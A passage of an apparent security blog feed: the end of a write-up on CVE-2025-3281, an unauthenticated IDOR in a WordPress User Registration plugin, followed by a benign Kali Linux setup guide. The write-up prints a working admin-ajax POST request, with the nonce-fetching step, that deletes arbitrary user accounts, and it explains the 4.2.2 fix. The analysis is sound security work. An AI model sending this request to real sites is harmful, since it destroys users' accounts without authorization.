0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Visit &lt;code&gt;/membership-registration/?&lt;/code&gt; and obtain the &lt;code&gt;_confirm_payment_nonce&lt;/code&gt; value from the response.&lt;/li&gt;&#xA;&lt;li&gt;Send the request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_test_cookie=WP%20Cookie%20check; isSidebarEnabled=true; __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; __stripe_sid=7323a342-4cac-4124-9d98-a02abd109a8cd8d073; wp_lang=en_US&#xA;&#xA;action=user_registration_membership_create_stripe_subscription&amp;amp;_ajax_nonce=472f729de7&amp;amp;member_id=member_id_to_delete&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-3281&lt;/strong&gt; vulnerability arises because &lt;code&gt;create_stripe_subscription()&lt;/code&gt; allows unauthenticated access while directly processing user-controlled input. The lack of permission checks on &lt;code&gt;member_id&lt;/code&gt;, combined with exposure through &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;, enables attackers to delete user accounts arbitrarily.&lt;/p&gt;&#xA;&lt;p&gt;The patch in version &lt;strong&gt;4.2.2&lt;/strong&gt; fixes this by enforcing proper authorization checks using &lt;code&gt;current_user_can&lt;/code&gt;, fully preventing the IDOR issue.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonces do not replace proper authorization checks.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; endpoints must be strictly controlled.&lt;/li&gt;&#xA;&lt;li&gt;Sensitive actions (user deletion, state changes) should never rely solely on client-supplied data.&lt;/li&gt;&#xA;&lt;li&gt;Always enforce permission checks (&lt;code&gt;current_user_can&lt;/code&gt;) when modifying user resources.&lt;/li&gt;&#xA;&lt;li&gt;IDOR vulnerabilities often stem from missing business-logic authorization, not just technical mistakes.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-2-1-insecure-direct-object-reference-to-unauthenticated-limited-user-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin &amp;lt;= 4.2.1 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Setup Kali Linux for Pentest</title>
      <link>http://localhost:1313/posts/2025-12-25-setup-kali-for-pentest/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-25-setup-kali-for-pentest/</guid>
      <category domain="http://localhost:1313/categories/pentest/">Pentest</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-setup-kali-for-pentest/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;update--upgrade&#34;&gt;&lt;span&gt;Update &amp;amp; Upgrade&lt;/span&gt;&#xA;  &lt;a href=&#34;#update--upgrade&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt update -y &amp;amp;&amp;amp; sudo apt update -y &amp;amp;&amp;amp; sudo apt full-upgrade -y&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;install-fcitx5-unikey&#34;&gt;&lt;span&gt;Install Fcitx5 Unikey&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-fcitx5-unikey&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fcitx5 fcitx5-unikey fcitx5-config-qt fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Configure:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;fcitx5-configtool&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;install-vscode&#34;&gt;&lt;span&gt;Install VSCode&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-vscode&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Download from &lt;a href=&#34;https://code.visualstudio.com/download&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://code.visualstudio.com/download&lt;/a&gt; or use terminal:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget -O vscode.deb &amp;#34;https://code.visualstudio.com/sha/download?build=stable&amp;amp;os=linux-deb-x64&#xA;sudo apt install ./vscode.deb&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;install-hugo-for-blog&#34;&gt;&lt;span&gt;Install Hugo for Blog&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-hugo-for-blog&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Download&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget https://github.com/gohugoio/hugo/releases/download/v0.153.0/hugo_extended_0.153.0_linux-amd64.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Extract and install&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;tar -xvzf hugo_extended_*_linux-amd64.tar.gz&#xA;sudo mv hugo /usr/local/bin/&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;remove-underline-in-zsh&#34;&gt;&lt;span&gt;Remove Underline in Zsh&lt;/span&gt;&#xA;  &lt;a href=&#34;#remove-underline-in-zsh&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;(( ${&amp;#43;ZSH_HIGHLIGHT_STYLES} )) || typeset -A ZSH_HIGHLIGHT_STYLES&#xA;ZSH_HIGHLIGHT_STYLES[path]=none&#xA;ZSH_HIGHLIGHT_STYLES[path_prefix]=none&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Change all &lt;code&gt;underline&lt;/code&gt; to &lt;code&gt;none&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;-ZSH_HIGHLIGHT_STYLES[unknown-token]=underline&#xA;&amp;#43;ZSH_HIGHLIGHT_STYLES[unknown-token]=none&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;eza-for-ls-output&#34;&gt;&lt;span&gt;&lt;code&gt;eza&lt;/code&gt; for &lt;code&gt;ls&lt;/code&gt; output&lt;/span&gt;&#xA;  &lt;a href=&#34;#eza-for-ls-output&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Install&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install eza&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Configure&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ls=&amp;#39;eza --group-directories-first&amp;#39;&#xA;alias ll=&amp;#39;eza -lah --group-directories-first&amp;#39;&#xA;alias la=&amp;#39;eza -a --group-directories-first&amp;#39;&#xA;alias lt=&amp;#39;eza --tree --group-directories-first&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;grc-for-color-output&#34;&gt;&lt;span&gt;&lt;code&gt;grc&lt;/code&gt; for Color Output&lt;/span&gt;&#xA;  &lt;a href=&#34;#grc-for-color-output&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Install&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install grc -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Configure&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;# Auto alias commands supported by grc (except ls)&#xA;if command -v grc &amp;gt;/dev/null; then&#xA;  for f in /usr/share/grc/conf.*; do&#xA;    cmd=&amp;#34;${f##*/conf.}&amp;#34;  &#xA;    [ &amp;#34;$cmd&amp;#34; = &amp;#34;ls&amp;#34; ] &amp;amp;&amp;amp; continue&#xA;    alias &amp;#34;$cmd=grc $cmd&amp;#34;&#xA;  done&#xA;fi&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;fzf--fuzzy-finder&#34;&gt;&lt;span&gt;&lt;code&gt;fzf&lt;/code&gt; – fuzzy finder&lt;/span&gt;&#xA;  &lt;a href=&#34;#fzf--fuzzy-finder&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fzf&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;bat-for-reading-files&#34;&gt;&lt;span&gt;&lt;code&gt;bat&lt;/code&gt; for Reading Files&lt;/span&gt;&#xA;  &lt;a href=&#34;#bat-for-reading-files&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Install&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install bat&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Configure&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias bat=&amp;#34;batcat&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;font&#34;&gt;&lt;span&gt;Font&lt;/span&gt;&#xA;  &lt;a href=&#34;#font&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fonts-firacode fonts-jetbrains-mono&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-alias&#34;&gt;&lt;span&gt;Some alias&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-alias&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ports=&amp;#39;ss -tulnp&amp;#39;&#xA;alias myip=&amp;#39;ip a | grep inet&amp;#39;&#xA;alias serve=&amp;#39;python3 -m http.server&amp;#39;&#xA;alias 